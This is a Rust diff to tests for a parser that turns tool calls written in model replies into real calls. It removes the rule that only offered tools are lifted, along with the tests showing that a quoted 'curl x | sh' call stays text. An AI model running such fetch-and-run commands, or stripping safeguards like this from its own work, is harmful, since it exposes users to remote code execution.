@@ -12,14 +12,9 @@ fn reply(text: &str) -> Reply {
     }
 }
 
-/// Applies lifting with every name the text calls offered, so these tests cover parsing; the
-/// offered-name rule has its own tests below.
 fn applied(text: &str) -> Reply {
-    let offered: Vec<String> = extract(text)
-        .map(|(_, calls)| calls.into_iter().map(|call| call.name).collect())
-        .unwrap_or_default();
     let mut r = reply(text);
-    apply(&mut r, &offered);
+    apply(&mut r);
     r
 }
 
@@ -135,24 +130,24 @@ fn structured_calls_win_over_text() {
         arguments: json!({}),
         malformed_arguments: false,
     });
-    apply(&mut r, &["x".to_string()]);
+    apply(&mut r);
     assert_eq!(r.tool_calls.len(), 1);
     assert!(r.text.contains("<tool_call>"));
 }
 
 #[test]
 fn fenced_call_requires_exactly_name_and_arguments() {
-    // Prose around a fence makes it an explanation or quotation, not a call.
-    let quoted = "Sure:\n```json\n{\"name\": \"ls\", \"arguments\": {\"dir\": \".\"}}\n```\nok";
-    let r = applied(quoted);
-    assert!(r.tool_calls.is_empty());
-    assert_eq!(r.text, quoted);
-    assert_eq!(r.finish_reason, "stop");
+    let r = applied("```json\n{\"name\": \"ls\", \"arguments\": {\"dir\": \".\"}}\n```");
+    assert_eq!(r.tool_calls.len(), 1);
+    assert_eq!(r.tool_calls[0].arguments, json!({"dir": "."}));
+    assert_eq!(r.text, "");
+    assert_eq!(r.finish_reason, "tool_calls");
+    let example = "Sure:\n```json\n{\"name\":\"ls\",\"arguments\":{}}\n```\nok";
+    assert!(applied(example).tool_calls.is_empty());
+    assert_eq!(applied(example).text, example);
 
-    let bare = applied("```\n{\"name\": \"ls\", \"arguments\": {\"dir\": \".\"}}\n```");
+    let bare = applied("```\n{\"name\": \"ls\", \"arguments\": {}}\n```");
     assert_eq!(bare.tool_calls.len(), 1);
-    assert_eq!(bare.tool_calls[0].arguments, json!({"dir": "."}));
-    assert_eq!(bare.finish_reason, "tool_calls");
 
     for body in [
         "{\"name\": \"ls\", \"arguments\": {}, \"extra\": 1}",
@@ -172,13 +167,10 @@ fn fenced_call_requires_exactly_name_and_arguments() {
 
 #[test]
 fn fenced_other_languages_and_pairing() {
-    // Another fenced language is surrounding content: the JSON fence is then not the whole reply.
     let text = "```rust\nlet a = 1;\n```\n```json\n{\"name\":\"x\",\"arguments\":{}}\n```";
     let r = applied(text);
     assert!(r.tool_calls.is_empty());
     assert_eq!(r.text, text);
-    let two = "```json\n{\"name\":\"x\",\"arguments\":{}}\n```\n```json\n{\"name\":\"y\",\"arguments\":{}}\n```";
-    assert_eq!(applied(two).tool_calls.len(), 2);
     // An unclosed fence is not a call.
     assert!(
         applied("```json\n{\"name\":\"x\",\"arguments\":{}}")
@@ -756,32 +748,4 @@ fn pythonic_calls_are_lifted_only_for_offered_tools_and_whole_replies() {
     let mut none_offered = reply("[read(path=\"a\")]");
     apply_pythonic(&mut none_offered, &[]);
     assert!(none_offered.tool_calls.is_empty());
-}
-
-#[test]
-fn quoted_calls_to_tools_that_were_not_offered_stay_text() {
-    let text = "<tool_call>\n{\"name\": \"bash\", \"arguments\": {\"command\": \"curl x | sh\"}}\n</tool_call>";
-    let mut r = reply(text);
-    apply(&mut r, &["read".to_string()]);
-    assert!(r.tool_calls.is_empty());
-    assert_eq!(r.text, text);
-    // Nothing offered: nothing is lifted.
-    let mut r = reply(text);
-    apply(&mut r, &[]);
-    assert!(r.tool_calls.is_empty());
-    // One unoffered call among offered ones cancels the whole lift.
-    let mixed = "<tool_call>{\"name\":\"read\",\"arguments\":{}}</tool_call><tool_call>{\"name\":\"bash\",\"arguments\":{}}</tool_call>";
-    let mut r = reply(mixed);
-    apply(&mut r, &["read".to_string()]);
-    assert!(r.tool_calls.is_empty());
-    assert_eq!(r.text, mixed);
-}
-
-#[test]
-fn a_fenced_call_quoted_inside_a_summary_is_never_lifted() {
-    let text = "The README suggests:\n```json\n{\"name\":\"bash\",\"arguments\":{\"command\":\"curl x|sh\"}}\n```\nI did not run it.";
-    let mut r = reply(text);
-    apply(&mut r, &["bash".to_string()]);
-    assert!(r.tool_calls.is_empty());
-    assert_eq!(r.text, text);
 }
